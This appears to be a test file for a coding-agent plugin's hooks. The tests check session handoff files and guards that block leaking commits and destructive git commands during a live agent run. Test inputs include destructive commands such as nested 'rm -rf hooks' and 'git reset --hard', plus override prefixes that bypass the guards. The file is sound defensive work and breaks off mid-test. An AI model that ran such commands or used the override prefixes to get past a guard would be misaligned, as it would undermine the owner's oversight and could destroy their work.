import { describe, it, expect, afterEach } from "vitest";
import {
  mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, existsSync, rmSync, symlinkSync, utimesSync,
} from "node:fs";
import { execFileSync, spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { basename, dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { createHash } from "node:crypto";

// Hook scripts live at the plugin root (repo root), not under server/ -- two
// levels up from server/test.
const scriptsDir = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "hooks", "scripts");
const BREADCRUMB = join(scriptsDir, "posttooluse-breadcrumb.mjs");
const PRECOMPACT = join(scriptsDir, "precompact-refresh.mjs");
const SESSIONSTART = join(scriptsDir, "sessionstart-continuity.mjs");
const SCRIPTS = scriptsDir;
const LEAKGUARD = join(SCRIPTS, "pretooluse-leakguard.mjs");
const RUNGUARD = join(SCRIPTS, "pretooluse-runguard.mjs");
const HARNESSGUARD = join(SCRIPTS, "pretooluse-harnessguard.mjs");

const dirs: string[] = [];
function freshDir(prefix: string): string {
  const d = mkdtempSync(join(tmpdir(), prefix));
  dirs.push(d);
  return d;
}
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

/**
 * The hook scripts hash `resolve(process.cwd())` inside the spawned child.
 * On macOS, os.tmpdir() lives under a symlinked prefix (/var -> /private/var),
 * which the OS canonicalizes on chdir but plain path.resolve() does not --
 * so the hash must be derived from the *child's* actual cwd, not the literal
 * mkdtempSync string, or every fixture path in this file would compute the
 * wrong handoff/banner path and silently test against nothing.
 */
function realCwd(dir: string): string {
  return execFileSync(process.execPath, ["-e", "process.stdout.write(process.cwd())"], {
    cwd: dir, encoding: "utf8",
  });
}

function hashAndBase(dir: string): { base: string; hash: string } {
  const real = realCwd(dir);
  const hash = createHash("sha256").update(real).digest("hex").slice(0, 16);
  return { base: basename(real), hash };
}

function handoffPathFor(home: string, projectDir: string): string {
  const { base, hash } = hashAndBase(projectDir);
  return join(home, ".cairn", "handoff", `${base}-${hash}.json`);
}

function bannerPathFor(home: string, projectDir: string): string {
  const { base, hash } = hashAndBase(projectDir);
  return join(home, ".cairn", "banner", `${base}-${hash}.md`);
}

function baseHandoff(overrides: Record<string, unknown> = {}) {
  return {
    version: 1,
    created: "2020-01-01T00:00:00.000Z",
    source: "tool",
    project: "proj",
    task: { current: "t1", title: "first task" },
    tasks_completed: [],
    tasks_remaining: [],
    blockers: [],
    decisions_in_flight: [],
    uncommitted_files: [],
    next_action: "keep going",
    notes: "n",
    partial: false,
    ...overrides,
  };
}

function writeHandoffFixture(home: string, projectDir: string, data: Record<string, unknown>): string {
  const path = handoffPathFor(home, projectDir);
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, JSON.stringify(data, null, 2) + "\n");
  return path;
}

/** Runs a hook script with cwd=projectDir, HOME=home, plus any extra env (e.g. CLAUDE_PROJECT_DIR). Returns trimmed stdout. */
function runHook(
  script: string,
  projectDir: string,
  home: string,
  extraEnv: Record<string, string> = {},
  stdin = "",
): string {
  // Hermetic child env: some runners (context-mode sandbox, subagent shells)
  // export CLAUDE_PROJECT_DIR, which every hook script prefers over cwd --
  // inherited unstripped it silently redirects every fixture path to the
  // real repo. Strip it and CAIRN_* unless a test passes one via extraEnv.
  // CLAUDE_CODE_ENABLE_TODO_TOOLS is stripped for the same reason: the
  // sessionstart advisory (#107) keys off its absence, and a runner that
  // happens to export it would silently flip the advisory tests.
  const env: Record<string, string | undefined> = { ...process.env, HOME: home, ...extraEnv };
  for (const k of Object.keys(env)) {
    const strip = k === "CLAUDE_PROJECT_DIR" || k === "CLAUDE_CODE_ENABLE_TODO_TOOLS" ||
      k.startsWith("CAIRN_");
    if (strip && !(k in extraEnv)) delete env[k];
  }
  return execFileSync(process.execPath, [script], {
    cwd: projectDir,
    env,
    encoding: "utf8",
    timeout: 5000,
    input: stdin,
  }).trim();
}

/** Fresh temp project dir -- alias over freshDir for leak-guard fixtures below. */
function tmpProj(): string {
  return freshDir("cairn-hooks-leakguard-");
}

/**
 * Runs a hook script with a stdin payload and captures exit status + stderr,
 * mirroring runHook's env plumbing (cwd=projectDir, CLAUDE_PROJECT_DIR passthrough)
 * but via spawnSync so a non-zero exit doesn't throw.
 */
function runHookRaw(
  script: string,
  projectDir: string,
  stdinPayload: string,
  extraEnv: Record<string, string> = {},
): { status: number | null; stderr: string; stdout: string } {
  const result = spawnSync(process.execPath, [script], {
    cwd: projectDir,
    env: { ...process.env, CLAUDE_PROJECT_DIR: projectDir, ...extraEnv },
    input: stdinPayload,
    encoding: "utf8",
    timeout: 5000,
  });
  return { status: result.status, stderr: result.stderr ?? "", stdout: result.stdout ?? "" };
}

/**
 * Hash/base as the scripts compute it for CLAUDE_PROJECT_DIR: that value is an env-var
 * string, never chdir'd into by the OS, so plain `path.resolve()` (no symlink
 * canonicalization) is exactly what the script's own pathHash does -- unlike the
 * process.cwd() case above, no realCwd detour is needed here.
 */
function hashAndBaseForEnvDir(dir: string): { base: string; hash: string } {
  const abs = resolve(dir);
  const hash = createHash("sha256").update(abs).digest("hex").slice(0, 16);
  return { base: basename(abs), hash };
}

function handoffPathForEnvDir(home: string, projectDir: string): string {
  const { base, hash } = hashAndBaseForEnvDir(projectDir);
  return join(home, ".cairn", "handoff", `${base}-${hash}.json`);
}

/**
 * Marginal cost of a hook, over and above starting a node interpreter.
 *
 * Timing a spawned hook with a plain wall-clock budget measures node's
 * startup, not the hook: on a quiet machine a bare `node -e ""` spawn is
 * ~31ms and the leak guard is ~32ms, so a 100ms absolute pin was 97%
 * interpreter and 3% subject. It duly failed the v2.5.0 publish gate at
 * 298ms on a shared runner and flaked three times in one local session,
 * every time reporting machine load as if it were a regression (#169).
 *
 * Measure the DIFFERENCE against a bare spawn instead, and take the
 * minimum of several samples rather than one reading: contention can only
 * ever make a sample slower, so the minimum is the robust estimator, and
 * a busy machine inflates the baseline and the subject together.
 *
 * `reset` runs between samples but outside the timed region, so a hook
 * with its own throttle still does real work on every sample.
 */
function marginalHookMs(run: () => void, reset?: () => void, samples = 5): number {
  const best = (f: () => void): number => {
    let min = Infinity;
    for (let i = 0; i < samples; i++) {
      reset?.();
      const t0 = Date.now();
      f();
      min = Math.min(min, Date.now() - t0);
    }
    return min;
  };
  const baseline = best(() => execFileSync(process.execPath, ["-e", ""], { encoding: "utf8" }));
  return best(run) - baseline;
}

/** A hook doing real work costs single-digit ms over a spawn; 50 catches a
 *  hook that started shelling out or reaching the network, and nothing else. */
const MARGINAL_BUDGET_MS = 50;

function backdateMtime(path: string, msAgo: number): void {
  const t = (Date.now() - msAgo) / 1000;
  utimesSync(path, t, t);
}

describe("hooks/scripts smoke check", () => {
  it("all three scripts exist", () => {
    for (const p of [BREADCRUMB, PRECOMPACT, SESSIONSTART]) expect(existsSync(p)).toBe(true);
  });
});

describe("posttooluse-breadcrumb", () => {
  it("no-handoff dir: exits cleanly and creates no file at all", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    const stdout = runHook(BREADCRUMB, proj, home);
    expect(stdout).toBe("");
    expect(existsSync(join(home, ".cairn"))).toBe(false);
  });

  it("is hermetic: a CLAUDE_PROJECT_DIR leaked from the runner's env cannot redirect the fixture", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    const elsewhere = freshDir("cairn-hooks-elsewhere-");
    const path = writeHandoffFixture(home, proj, baseHandoff());
    backdateMtime(path, 70_000);

    const before = readFileSync(path, "utf8");
    // Simulate a polluted runner (context-mode sandbox, subagent shells):
    // the parent process carries CLAUDE_PROJECT_DIR pointing somewhere else.
    const saved = process.env.CLAUDE_PROJECT_DIR;
    process.env.CLAUDE_PROJECT_DIR = elsewhere;
    try {
      runHook(BREADCRUMB, proj, home);
    } finally {
      if (saved === undefined) delete process.env.CLAUDE_PROJECT_DIR;
      else process.env.CLAUDE_PROJECT_DIR = saved;
    }

    // The write must land at the fixture's cwd-derived path, not elsewhere's.
    expect(readFileSync(path, "utf8")).not.toBe(before);
  });

  it("storm test: 5 rapid invocations produce at most 1 write (60s throttle)", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    const path = writeHandoffFixture(home, proj, baseHandoff());
    backdateMtime(path, 70_000); // older than the 60s throttle window

    const before = readFileSync(path, "utf8");
    const snapshots: string[] = [];
    for (let i = 0; i < 5; i++) {
      runHook(BREADCRUMB, proj, home);
      snapshots.push(readFileSync(path, "utf8"));
    }

    // First invocation lands a write (mtime was stale); the remaining 4,
    // fired immediately after, land inside the 60s window and no-op.
    expect(snapshots[0]).not.toBe(before);
    for (let i = 1; i < snapshots.length; i++) expect(snapshots[i]).toBe(snapshots[0]);

    const written = JSON.parse(snapshots[0]);
    expect(written.source).toBe("posttooluse");
    expect(written.task).toEqual({ current: "t1", title: "first task" }); // preserved verbatim
    expect(written.next_action).toBe("keep going"); // preserved verbatim

    // Atomic write leaves no .tmp residue behind.
    const files = readdirSync(dirname(path));
    expect(files.some((f) => f.endsWith(".tmp"))).toBe(false);
  });

  it("captures uncommitted files from git status --porcelain, capped at 20", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    execFileSync("git", ["init", "-q"], { cwd: proj });
    execFileSync("git", ["config", "user.email", "t@t.com"], { cwd: proj });
    execFileSync("git", ["config", "user.name", "t"], { cwd: proj });
    for (let i = 0; i < 25; i++) writeFileSync(join(proj, `f${i}.txt`), "x");

    const path = writeHandoffFixture(home, proj, baseHandoff());
    backdateMtime(path, 70_000);
    runHook(BREADCRUMB, proj, home);

    const written = JSON.parse(readFileSync(path, "utf8"));
    expect(written.source).toBe("posttooluse");
    expect(written.uncommitted_files.length).toBe(20);
    expect(written.uncommitted_files).toContain("f0.txt");
  });

  it("costs almost nothing beyond starting node", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    const path = writeHandoffFixture(home, proj, baseHandoff());

    // Backdating between samples defeats the 60s throttle, so every timed
    // run takes the real write path rather than the early return.
    const marginal = marginalHookMs(
      () => runHook(BREADCRUMB, proj, home),
      () => backdateMtime(path, 70_000),
    );
    expect(marginal).toBeLessThan(MARGINAL_BUDGET_MS);
  });

  it("CLAUDE_PROJECT_DIR, not cwd, governs the handoff path when both are set", () => {
    const cwdDir = freshDir("cairn-hooks-cwd-"); // spawned cwd -- must be ignored when CLAUDE_PROJECT_DIR is set
    const projectDir = freshDir("cairn-hooks-projectdir-"); // CLAUDE_PROJECT_DIR -- must win, matching the server's `?? cwd` fallback
    const home = freshDir("cairn-hooks-home-");

    const path = handoffPathForEnvDir(home, projectDir);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, JSON.stringify(baseHandoff(), null, 2) + "\n");
    backdateMtime(path, 70_000);

    // Decoy handoff keyed off cwd's own hash -- must be left untouched, proving cwd was ignored.
    const decoyPath = writeHandoffFixture(home, cwdDir, baseHandoff({ source: "decoy" }));
    backdateMtime(decoyPath, 70_000);
    const decoyBefore = readFileSync(decoyPath, "utf8");

    runHook(BREADCRUMB, cwdDir, home, { CLAUDE_PROJECT_DIR: projectDir });

    const written = JSON.parse(readFileSync(path, "utf8"));
    expect(written.source).toBe("posttooluse");
    expect(readFileSync(decoyPath, "utf8")).toBe(decoyBefore);
  });
});

describe("precompact-refresh", () => {
  it("no-handoff dir: exits cleanly and creates no file at all", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    const stdout = runHook(PRECOMPACT, proj, home);
    expect(stdout).toBe("");
    expect(existsSync(join(home, ".cairn"))).toBe(false);
  });

  it("is unthrottled: writes even immediately after a fresh write", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    const path = writeHandoffFixture(home, proj, baseHandoff());
    backdateMtime(path, 70_000);
    runHook(BREADCRUMB, proj, home); // lands a write, refreshes mtime to "now"

    const before = readFileSync(path, "utf8");
    runHook(PRECOMPACT, proj, home); // must NOT be throttled by the fresh mtime
    const after = readFileSync(path, "utf8");

    expect(after).not.toBe(before);
    expect(JSON.parse(after).source).toBe("precompact");
    expect(JSON.parse(after).next_action).toBe("keep going"); // preserved verbatim
  });
});

describe("sessionstart-continuity", () => {
  it("nothing present: emits no stdout", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    const stdout = runHook(SESSIONSTART, proj, home);
    expect(stdout).toBe("");
  });

  it("resume:prompt (default) asks the user, in the documented JSON shape", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    writeHandoffFixture(home, proj, baseHandoff({
      phase: { number: 3, slug: "continuity" },
      issue: "cairn-42",
      next_action: "implement writeHandoff skeleton guard",
    }));

    const stdout = runHook(SESSIONSTART, proj, home);
    const parsed = JSON.parse(stdout);
    expect(parsed.hookSpecificOutput.hookEventName).toBe("SessionStart");
    const ctx: string = parsed.hookSpecificOutput.additionalContext;
    expect(ctx).toContain("phase: 3 (continuity)");
    expect(ctx).toContain("issue: cairn-42");
    expect(ctx).toContain("t1");
    expect(ctx).toContain("implement writeHandoff skeleton guard");
    expect(ctx.toLowerCase()).toContain("ask the user");
    expect(ctx).not.toContain("without asking the user");
  });

  it("resume:auto instructs an automatic resume instead of asking", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    writeFileSync(join(proj, "cairn.json"), JSON.stringify({
      tracker: { type: "github", config: { repo: "o/r" } },
      continuity: { resume: "auto" },
    }));
    writeHandoffFixture(home, proj, baseHandoff());

    const stdout = runHook(SESSIONSTART, proj, home);
    const parsed = JSON.parse(stdout);
    const ctx: string = parsed.hookSpecificOutput.additionalContext;
    expect(ctx).toContain("without asking the user");
    expect(ctx.toLowerCase()).not.toContain("ask the user whether");
  });

  it("resume:off suppresses the resume block entirely (no stdout, handoff present)", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    writeFileSync(join(proj, "cairn.json"), JSON.stringify({
      tracker: { type: "github", config: { repo: "o/r" } },
      continuity: { resume: "off" },
    }));
    writeHandoffFixture(home, proj, baseHandoff());

    // Flag set so the task-mirror advisory (#107) stays out of the way --
    // this test is about resume suppression only.
    const stdout = runHook(SESSIONSTART, proj, home, { CLAUDE_CODE_ENABLE_TODO_TOOLS: "1" });
    expect(stdout).toBe("");
  });

  it("task-mirror advisory (#107): cairn project without the flag gets one conditional line", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    writeFileSync(join(proj, "cairn.json"), JSON.stringify({
      tracker: { type: "github", config: { repo: "o/r" } },
      continuity: { resume: "off" },
    }));

    const stdout = runHook(SESSIONSTART, proj, home);
    const parsed = JSON.parse(stdout);
    const ctx: string = parsed.hookSpecificOutput.additionalContext;
    expect(ctx).toContain("CLAUDE_CODE_ENABLE_TODO_TOOLS=1");
    expect(ctx).toContain("mirror");
    // Conditional phrasing -- the hook can't see the model, so it must never
    // assert the tools ARE off, only what to do if they are.
    expect(ctx).toContain("if TaskCreate is unavailable");
  });

  it("task-mirror advisory: flag set means no advisory; non-cairn dir means no advisory", () => {
    const home = freshDir("cairn-hooks-home-");

    const cairnProj = freshDir("cairn-hooks-proj-");
    writeFileSync(join(cairnProj, "cairn.json"), JSON.stringify({
      tracker: { type: "github", config: { repo: "o/r" } },
    }));
    expect(runHook(SESSIONSTART, cairnProj, home, { CLAUDE_CODE_ENABLE_TODO_TOOLS: "1" })).toBe("");

    const plainProj = freshDir("cairn-hooks-proj-");
    expect(runHook(SESSIONSTART, plainProj, home)).toBe("");
  });

  it("includes the banner file verbatim when present, even with resume:off", () => {
    const proj = freshDir("cairn-hooks-proj-");
    const home = freshDir("cairn-hooks-home-");
    writeFileSync(join(proj, "cairn.json"), JSON.stringify({
      tracker: { type: "github", config: { repo: "o/r" } },
      continuity: { resume: "off" },
    }));
    const bannerPath = bannerPathFor(home, proj);
    mkdirSync(dirname(bannerPath), { recursive: true });
    writeFileSync(bannerPath, "## cairn recall index — proj\nsome banner content\n");
    writeHandoffFixture(home, proj, baseHandoff());

    const stdout = runHook(SESSIONSTART, proj, home);
    const parsed = JSON.parse(stdout);
    const ctx: string = parsed.hookSpecificOutput.additionalContext;
    expect(ctx).toContain("some banner content");
    expect(ctx.toLowerCase()).not.toContain("ask the user whether");
    expect(ctx).not.toContain("without asking the user");
  });
});

const payload = (command: string) =>
  JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: "" });

function gitInit(dir: string): void {
  execFileSync("git", ["init", "-q"], { cwd: dir });
  execFileSync("git", ["config", "user.email", "t@t"], { cwd: dir });
  execFileSync("git", ["config", "user.name", "t"], { cwd: dir });
}

function stageFile(dir: string, name: string, content: string): void {
  writeFileSync(join(dir, name), content);
  execFileSync("git", ["add", name], { cwd: dir });
}

describe("leak guard hook", () => {
  it("blocks a staged .cairn/ leak in a source file (exit 2, listing on stderr)", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    stageFile(proj, "app.ts", 'const p = ".cairn/plans/x";\n');
    const r = runHookRaw(LEAKGUARD, proj, payload("git commit -m x"));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("app.ts:1:");
    expect(r.stderr).toContain("cairn-path");
  });

  it("clean staging passes; markdown files are allowlisted", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    stageFile(proj, "clean.ts", "const ok = true;\n");
    stageFile(proj, "notes.md", "see .cairn/plans/roadmap.md\n");
    expect(runHookRaw(LEAKGUARD, proj, payload("git commit -m x")).status).toBe(0);
  });

  it("non-commit commands exit 0 without scanning", () => {
    const proj = tmpProj();
    expect(runHookRaw(LEAKGUARD, proj, payload("git status")).status).toBe(0);
  });

  it("CAIRN_LEAK_OK=1 and leakGuard.enabled=false both bypass", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    stageFile(proj, "app.ts", 'const p = ".cairn/x";\n');
    expect(runHookRaw(LEAKGUARD, proj,
      payload("CAIRN_LEAK_OK=1 git commit -m x")).status).toBe(0);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } },
        leakGuard: { enabled: false } }));
    expect(runHookRaw(LEAKGUARD, proj, payload("git commit -m x")).status).toBe(0);
  });

  it("CAIRN_LEAK_OK=1 quoted in the commit message does NOT bypass", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    stageFile(proj, "app.ts", 'const p = ".cairn/x";\n');
    // token appears mid-command (inside the message), not as a prefix -- must still block
    const r = runHookRaw(LEAKGUARD, proj,
      payload('git commit -m "add CAIRN_LEAK_OK=1 feature flag"'));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("app.ts:1:");
  });

  it("costs almost nothing beyond starting node", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    stageFile(proj, "clean.ts", "const ok = true;\n");
    const marginal = marginalHookMs(
      () => runHookRaw(LEAKGUARD, proj, payload("git commit -m x")));
    expect(marginal).toBeLessThan(MARGINAL_BUDGET_MS);
  });

  // #140 path-scoped exemption -- fixture strings are concatenated so this
  // file's own diff never trips the live guard when committed.
  it("server/src file naming a .cairn path is exempt from cairn-path (exit 0)", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    mkdirSync(join(proj, "server", "src", "planning"), { recursive: true });
    stageFile(proj, "server/src/planning/ledger.ts",
      'const dir = ".cairn' + '/plans/x";\n');
    expect(runHookRaw(LEAKGUARD, proj, payload("git commit -m x")).status).toBe(0);
  });

  it("exemption is cairn-path ONLY: a tracker-id leak in server/src still blocks (exit 2)", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "jira", config: { projectKey: "DRILL" } } }));
    mkdirSync(join(proj, "server", "src"), { recursive: true });
    stageFile(proj, "server/src/x.ts", "// tracked as DRILL" + "-42\n");
    const r = runHookRaw(LEAKGUARD, proj, payload("git commit -m x"));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("tracker-id");
  });

  it("exemption does not widen: a non-server source file with a .cairn path still blocks (exit 2)", () => {
    // docs/ and *.md were already allowlisted wholesale pre-#140; the "still
    // strict" surface is every non-markdown file outside server/src|dist.
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    mkdirSync(join(proj, "scripts"), { recursive: true });
    stageFile(proj, "scripts/gen.sh", 'DIR=".cairn' + '/plans"\n');
    const r = runHookRaw(LEAKGUARD, proj, payload("git commit -m x"));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("cairn-path");
  });

  it("`git commit -am` widens the scan to catch a leak in an unstaged tracked file (exit 2)", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    // commit a clean baseline so app.ts is tracked and HEAD exists
    stageFile(proj, "app.ts", "const ok = true;\n");
    execFileSync("git", ["commit", "-q", "-m", "init"], { cwd: proj });
    // modify the tracked file WITHOUT staging -- `-am` would auto-stage this,
    // so a `--cached`-only scan would miss it
    writeFileSync(join(proj, "app.ts"), 'const p = ".cairn/plans/x";\n');
    const r = runHookRaw(LEAKGUARD, proj, payload("git commit -am x"));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("app.ts:1:");
    expect(r.stderr).toContain("cairn-path");
  });

  it("same unstaged tracked leak with plain `git commit -m x` exits 0 (narrow scan sees nothing staged)", () => {
    const proj = tmpProj(); gitInit(proj);
    writeFileSync(join(proj, "cairn.json"),
      JSON.stringify({ tracker: { type: "github", config: { repo: "o/r" } } }));
    stageFile(proj, "app.ts", "const ok = true;\n");
    execFileSync("git", ["commit", "-q", "-m", "init"], { cwd: proj });
    writeFileSync(join(proj, "app.ts"), 'const p = ".cairn/plans/x";\n');
    const r = runHookRaw(LEAKGUARD, proj, payload("git commit -m x"));
    expect(r.status).toBe(0);
  });
});

describe("run guard hook", () => {
  /** Project + git repo + an isolated cairn home for its run manifests. */
  function runFixture(status?: string): { proj: string; home: string; runId: string } {
    const proj = tmpProj();
    gitInit(proj);
    stageFile(proj, "seed.txt", "seed\n");
    execFileSync("git", ["commit", "-q", "-m", "init"], { cwd: proj });
    const home = freshDir("cairn-hooks-runguard-home-");
    const runId = "run-abc123";
    if (status) {
      // The guard recomputes the manifest name from CLAUDE_PROJECT_DIR the
      // same way the server does -- plain resolve(), no symlink canonicalization
      // -- so the fixture must hash that same literal value.
      const { base, hash } = hashAndBaseForEnvDir(proj);
      mkdirSync(join(home, "runs"), { recursive: true });
      writeFileSync(join(home, "runs", `${base}-${hash}-${runId}.json`),
        JSON.stringify({ version: 1, runId, status }));
    }
    return { proj, home, runId };
  }

  const cwdPayload = (command: string, cwd: string) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd });

  it("blocks git checkout in the owner's checkout while a run is live", () => {
    const { proj, home, runId } = runFixture("running");
    const r = runHookRaw(RUNGUARD, proj, cwdPayload("git checkout -b feature", proj),
      { CAIRN_HOME: join(home) });
    expect(r.status).toBe(2);
    expect(r.stderr).toContain(runId);
    expect(r.stderr).toContain("git checkout");
    // #262 -- names the owner's way to approve, never the override prefix
    expect(r.stderr).toContain("needs the owner's go-ahead");
    expect(r.stderr).toContain("not the owner asking");
    expect(r.stderr).not.toContain("CAIRN_RUN_OK");
  });

  it("blocks git switch and git reset --hard the same way", () => {
    const { proj, home } = runFixture("running");
    const env = { CAIRN_HOME: home };
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("git switch main", proj), env).status).toBe(2);
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("git reset --hard HEAD~1", proj), env)
      .status).toBe(2);
  });

  it("a --hard after an unquoted $(...) is still the reset's flag (#319)", () => {
    const { proj, home } = runFixture();
    const env = { CAIRN_HOME: home };
    const r = runHookRaw(RUNGUARD, proj, cwdPayload("git reset $(git rev-parse HEAD~1) --hard", proj), env);
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("git reset");
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("git diff $(git rev-parse HEAD~1)", proj), env).status).toBe(0);
  });

  it("a reset inside a process substitution or arithmetic is still a reset (#320)", () => {
    const { proj, home } = runFixture();
    const env = { CAIRN_HOME: home };
    const r = runHookRaw(RUNGUARD, proj, cwdPayload("diff <(git reset --hard) /dev/null", proj), env);
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("git reset");
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("echo $(( $(git reset --hard) ))", proj), env).status).toBe(2);
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("diff <(sort a) <(sort b)", proj), env).status).toBe(0);
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("echo $((1+2))", proj), env).status).toBe(0);
  });

  it("a line nested deeper than the reader reads is refused unread, and fast (#321)", () => {
    const { proj, home } = runFixture();
    const env = { CAIRN_HOME: home };
    const nested = (d: number) => "echo " + "$(a ".repeat(d) + "rm -rf hooks" + ")".repeat(d);
    const r = runHookRaw(RUNGUARD, proj, cwdPayload(nested(9), proj), env);
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("deeper than the guard reads");
    expect(runHookRaw(RUNGUARD, proj, cwdPayload(nested(8), proj), env).status).toBe(0);
    const t0 = Date.now();
    expect(runHookRaw(RUNGUARD, proj, cwdPayload(nested(120), proj), env).status).toBe(2);
    expect(Date.now() - t0).toBeLessThan(1500); // ~6 s before the cap; a generous ceiling, not a benchmark
  });

  it("allows the same command inside the run's own worktree", () => {
    const { proj, home } = runFixture("running");
    const wt = join(freshDir("cairn-hooks-runguard-wt-"), "tree");
    execFileSync("git", ["worktree", "add", "-q", "-b", "runbranch", wt], { cwd: proj });
    const r = runHookRaw(RUNGUARD, proj, cwdPayload("git checkout -b other", wt),
      { CAIRN_HOME: home });
    expect(r.status).toBe(0);
  });

  it("no live run: the same command passes untouched", () => {
    const { proj, home } = runFixture("complete");
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("git checkout main", proj),
      { CAIRN_HOME: home }).status).toBe(0);
    const bare = runFixture();
    expect(runHookRaw(RUNGUARD, bare.proj, cwdPayload("git checkout main", bare.proj),
      { CAIRN_HOME: bare.home }).status).toBe(0);
  });

  it("harmless git commands pass while a run is live", () => {
    const { proj, home } = runFixture("running");
    const env = { CAIRN_HOME: home };
    for (const c of ["git status", "git log --oneline", 'git commit -m "checkout the docs"']) {
      expect(runHookRaw(RUNGUARD, proj, cwdPayload(c, proj), env).status).toBe(0);
    }
  });

  it("CAIRN_RUN_OK=1 overrides once, and only as a prefix", () => {
    const { proj, home } = runFixture("running");
    const env = { CAIRN_HOME: home };
    expect(runHookRaw(RUNGUARD, proj,
      cwdPayload("CAIRN_RUN_OK=1 git checkout main", proj), env).status).toBe(0);
    expect(runHookRaw(RUNGUARD, proj,
      cwdPayload('git checkout main -m "CAIRN_RUN_OK=1"', proj), env).status).toBe(2);
  });

  it("honours git -C when it retargets the owner's checkout", () => {
    const { proj, home } = runFixture("running");
    const elsewhere = freshDir("cairn-hooks-runguard-cwd-");
    const r = runHookRaw(RUNGUARD, proj,
      cwdPayload(`git -C ${proj} checkout main`, elsewhere), { CAIRN_HOME: home });
    expect(r.status).toBe(2);
  });

  it("follows a cd, --git-dir/--work-tree or GIT_DIR into the owner's checkout the way it follows -C (#306)", () => {
    const { proj, home } = runFixture("running");
    const elsewhere = freshDir("cairn-hooks-runguard-cwd-");
    for (const c of [
      `cd ${proj} && git checkout main`,
      `git --git-dir=${proj}/.git --work-tree=${proj} checkout main`,
      `GIT_DIR=${proj}/.git GIT_WORK_TREE=${proj} git switch main`,
      'cd "$OWNER" && git checkout main',
    ]) {
      const r = runHookRaw(RUNGUARD, proj, cwdPayload(c, elsewhere), { CAIRN_HOME: home });
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toContain("run-abc123");
    }
    // a folder that holds no repository is nobody's checkout
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("cd . && git checkout main", elsewhere),
      { CAIRN_HOME: home }).status).toBe(0);
  });

  it("a corrupt manifest is not evidence of a live run", () => {
    const { proj, home } = runFixture();
    const { base, hash } = hashAndBaseForEnvDir(proj);
    mkdirSync(join(home, "runs"), { recursive: true });
    writeFileSync(join(home, "runs", `${base}-${hash}-broken.json`), "{ not json");
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("git checkout main", proj),
      { CAIRN_HOME: home }).status).toBe(0);
  });

  it("a runs folder that exists but can't be read can't vouch that no run is live (#299)", () => {
    const { proj, home } = runFixture();
    writeFileSync(join(home, "runs"), "a file where the folder should be");
    const env = { CAIRN_HOME: home };
    for (const c of ["git checkout main", "git push origin feature"]) {
